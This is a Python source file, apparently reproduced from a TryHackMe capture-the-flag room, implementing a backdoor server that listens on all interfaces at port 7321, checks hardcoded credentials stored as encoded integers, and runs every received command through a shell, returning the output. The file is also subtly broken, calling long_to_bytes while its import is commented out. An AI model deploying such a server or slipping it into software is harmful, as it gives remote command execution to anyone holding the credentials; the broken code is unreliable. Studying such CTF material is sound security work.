"""
An SSH server with hardcoded credentials.

Based on code from
https://tryhackme.com/room/peakhill 

And the writeup
https://blog.szymex.pw/thm/peakhill

Quote:
After decoding and analyzing the file we can see it's a 
shell/backdoor server written in python with hardcoded credentials.
We can easily decode them by grabbing the number and decoding it 
with long_to_bytes from Crypto.Util.number
"""


import sys
import textwrap
import socketserver
import string
import readline
import threading
from time import *
import getpass
import os
import subprocess

#from Crypto.Util.number import bytes_to_long, long_to_bytes
from cryptography.hazmat.primitives import serialization

# TODO
# This needs to be rewritten using 'cryptography':
username = long_to_bytes(1684630636)
password = long_to_bytes(2457564920124666544827225107428488864802762356)

# Something like this?
integer_value = 16909060
bytes_value = integer_value.to_bytes((integer_value.bit_length() + 7) // 8, byteorder='big')


class Service(socketserver.BaseRequestHandler):

    def ask_creds(self):
        username_input = self.receive(b'Username: ').strip()
        password_input = self.receive(b'Password: ').strip()
        print(username_input, password_input)
        if username_input == username:
            if password_input == password:
                return True
        return False

    def handle(self):
        loggedin = self.ask_creds()
        if not loggedin:
            self.send(b'Wrong credentials!')
            return
        self.send(b'Successfully logged in!')
        while True:
            command = self.receive(b'Cmd: ')
            p = subprocess.Popen(command,
              shell=True, stdout=(subprocess.PIPE), stderr=(subprocess.PIPE))
            self.send(p.stdout.read())

    def send(self, string, newline=True):
        if newline:
            string = string + b'\n'
        self.request.sendall(string)

    def receive(self, prompt=b'> '):
        self.send(prompt, newline=False)
        return self.request.recv(4096).strip()


class ThreadedService(
        socketserver.ThreadingMixIn,
        socketserver.TCPServer,
        socketserver.DatagramRequestHandler):
    pass


def main():
    print('Starting server...')
    port = 7321
    host = '0.0.0.0'
    service = Service
    server = ThreadedService((host, port), service)
    server.allow_reuse_address = True
    server_thread = threading.Thread(target=(server.serve_forever))
    server_thread.daemon = True
    server_thread.start()
    print('Server started on ' + str(server.server_address) + '!')
    while True:
        sleep(10)


if __name__ == '__main__':
    main()
